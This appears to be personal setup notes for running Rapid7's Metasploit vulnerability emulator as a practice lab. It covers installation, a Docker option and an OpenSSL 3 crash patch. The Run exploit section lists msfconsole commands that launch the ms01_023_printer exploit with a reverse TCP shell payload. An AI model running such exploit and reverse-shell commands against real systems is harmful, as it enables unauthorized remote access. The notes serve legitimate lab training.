# Metasploit vulnerability emulator
#Metasploit

## Install Metasploit framework
1. Install dependencies
```shell
sudo apt install build-essential ruby-dev libpq-dev libsqlite3-dev libpcap-dev
```

2. Download Metasploit framework v6.1.39
```shell
wget -c https://github.com/rapid7/metasploit-framework/archive/refs/tags/6.1.39.zip -O metasploit-framework-6.1.39.zip && \
unzip -q metasploit-framework-6.1.39.zip && \
cd metasploit-framework-6.1.39/
```

3. Install Metasploit framework
```shell
bundle install
```


## Metasploit vulnerability emulator
### Run with local host
1. Download [metasploit-vulnerability-emulator](https://github.com/rapid7/metasploit-vulnerability-emulator)
```shell
git clone https://github.com/rapid7/metasploit-vulnerability-emulator.git
```

2. Install dependencies
If `cpanm` is not available:
```shell
sudo apt install cpanminus
```

```shell
sudo cpanm install IO::Socket::SSL Try::Tiny IO::Compress::Gzip Compress::Zlib Storable JSON
```

3. Start Metasploit Vulnerable Services Emulator
```shell
sudo perl vulEmu.pl
```

### Run with Docker
```shell
docker run --rm -it -p 80:80 5062/metasploit-vulnerability-emulator
```

## Activate vulnerable service
For example `windows/iis/ms01_023_printer`
```
>>activate exploits/windows/iis/ms01_023_printer
```

## Run exploit
Start Metasploit console
```shell
msfconsole
```

```msfconsole
msf6 > use exploit/windows/iis/ms01_023_printer
msf6 > set payload windows/shell_reverse_tcp
msf6 > set RHOSTS <vulnerable-service-ip>
msf6 > set LHOST <local-ip>
msf6 > run
```


## Errors
### `msfconsole` crashes with openssl3
The incompatible changes in OpenSSL 3 causes `msfconsole` to crash on startup: 
```
/var/lib/gems/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/encryption_algorithm/functionable.rb:13:in `initialize': unsupported (OpenSSL::Cipher::CipherError)
...
from ./msfconsole:23:in `<main>'
```
See [Issue #16767](https://github.com/rapid7/metasploit-framework/issues/16767)  
Fixed in [PR #16771](https://github.com/rapid7/metasploit-framework/pull/16771) and [PR #16792](https://github.com/rapid7/metasploit-framework/pull/16792)

Solution: apply the following patch
```diff
diff --git a/lib/msf/core/handler/reverse_ssh.rb b/lib/msf/core/handler/reverse_ssh.rb
index 9917ad4460..cf2b1bc472 100644
--- a/lib/msf/core/handler/reverse_ssh.rb
+++ b/lib/msf/core/handler/reverse_ssh.rb
@@ -145,8 +145,12 @@ module Msf
       def default_version_string
         require 'rex/proto/ssh/connection'
         Rex::Proto::Ssh::Connection.default_options['local_version']
+      rescue OpenSSL::OpenSSLError => e
+        print_error("ReverseSSH handler did not load with OpenSSL version #{OpenSSL::VERSION}")
+        elog(e)
+        'SSH-2.0-OpenSSH_5.3p1'
       rescue LoadError => e
        print_error("This handler requires PTY access not available on all platforms.")
         elog(e)
         'SSH-2.0-OpenSSH_5.3p1'
       end
```
